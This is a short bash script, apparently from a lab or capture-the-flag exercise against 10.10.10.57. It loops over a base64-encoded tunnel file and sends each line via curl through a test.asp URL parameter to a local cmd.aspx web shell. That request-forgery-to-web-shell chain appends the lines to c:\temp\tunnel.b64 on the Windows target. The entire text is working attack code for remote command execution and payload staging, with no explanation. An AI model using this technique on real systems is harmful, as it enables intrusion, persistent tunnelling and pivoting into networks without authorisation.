export IFS=$'\n'
for line in $(cat tunnel.b64)
do
	gg="echo ${line} >> c:\temp\tunnel.b64"
	curl -v -G -X GET 'http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx' --data-urlencode "xcmd=$gg"
done
